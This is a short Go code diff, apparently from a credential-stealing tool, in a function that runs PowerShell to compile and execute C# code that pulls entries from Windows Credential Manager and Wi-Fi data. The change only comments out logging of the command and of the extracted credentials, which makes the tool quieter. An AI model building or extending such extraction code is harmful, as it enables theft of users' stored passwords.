@@ -65,7 +65,7 @@ func CredManModuleStart() common.ExtractWifiData{
 		log.Println(err) //Оставлю тут на будущее
 	}
 	var csToExec = "$source = Get-Content -Path \"" + tmpfile.Name() +"\";"
-	log.Println(csToExec)
+	//log.Println(csToExec)
 	cmd := exec.Command("powershell", csToExec, "Add-Type", "-TypeDefinition", "\"$source\";", "[getdata]::get()")
 	var(
 		output, _ = cmd.Output()
@@ -76,7 +76,7 @@ func CredManModuleStart() common.ExtractWifiData{
 
 	for i:=range credentialData{
 		var tmpElems = strings.Split(credentialData[i], " ")
-		log.Println(tmpElems[0], strings.Join(tmpElems[1:], ""))
+		//log.Println(tmpElems[0], strings.Join(tmpElems[1:], ""))
 
 		if len(tmpElems[0]) == 0{
 			continue
